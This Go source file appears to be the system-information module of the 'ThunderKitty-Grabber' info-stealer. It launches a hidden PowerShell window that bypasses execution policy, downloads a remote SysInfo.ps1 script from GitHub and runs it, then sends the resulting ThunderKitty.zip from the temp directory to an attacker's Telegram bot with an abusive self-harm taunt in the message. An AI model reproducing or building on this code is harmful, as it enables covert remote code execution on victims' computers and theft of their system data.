package SysInfo

import (
	requests "ThunderKitty-Grabber/utils/telegramsend"
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

const (
	creatnewconsole  = 0x00000010
	inf              = 0xFFFFFFFF
	strtfushowwindow = 0x00000001
	swhide           = 0
)

type (
	HANDLE uintptr
)

type STARTUPINFO struct {
	Cb              uint32
	LpReserved      *byte
	LpDesktop       *byte
	LpTitle         *byte
	DwX             uint32
	DwY             uint32
	DwXSize         uint32
	DwYSize         uint32
	DwXCountChars   uint32
	DwYCountChars   uint32
	DwFillAttribute uint32
	DwFlags         uint32
	WShowWindow     uint16
	CbReserved2     uint16
	LpReserved2     *byte
	HStdInput       HANDLE
	HStdOutput      HANDLE
	HStdError       HANDLE
}

type PROCESS_INFORMATION struct {
	Process HANDLE
	Thread  HANDLE
	Pid     uint32
	Tid     uint32
}

func Fetch(TelegramBotToken, TelegramChatId string) {
	err := sysinfo(`powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://raw.githubusercontent.com/EvilBytecode/ThunderKitty/main/powershellstuff/SysInfo.ps1')|iex"`)
	if err != nil {
		fmt.Printf("Error executing PowerShell command: %v\n", err)
	}

	fmt.Println("Sending sysinfo now!!!!!")
	// Send the system info zip file to the user's Telegram
	path := filepath.Join(os.TempDir(), "ThunderKitty.zip")
	err = requests.SendToTelegram(TelegramBotToken, TelegramChatId, "Kilth yourthelf bro", path)
	if err != nil {
		fmt.Printf("Error executing Telegram command: %v\n", err)
	}
}

func sysinfo(command string) error {
	cmdptr, err := syscall.UTF16PtrFromString(command)
	if err != nil {
		return fmt.Errorf("failed to create UTF16 pointer from command: %v", err)
	}
	var (
		createprocw         = syscall.NewLazyDLL("kernel32.dll").NewProc("CreateProcessW")
		waitforsingleobject = syscall.NewLazyDLL("kernel32.dll").NewProc("WaitForSingleObject")
		closehandle         = syscall.NewLazyDLL("kernel32.dll").NewProc("CloseHandle")
	)
	var si STARTUPINFO
	var pi PROCESS_INFORMATION
	si.Cb = uint32(unsafe.Sizeof(si))
	si.DwFlags = strtfushowwindow
	si.WShowWindow = swhide

	ret, _, err := createprocw.Call(0, uintptr(unsafe.Pointer(cmdptr)), 0, 0, 0, creatnewconsole, 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
	if ret == 0 {
		return fmt.Errorf("CreateProcessW failed: %v", err)
	}
	_, _, _ = waitforsingleobject.Call(uintptr(pi.Process), inf)
	_, _, _ = closehandle.Call(uintptr(pi.Process))
	_, _, _ = closehandle.Call(uintptr(pi.Thread))
	return nil
}
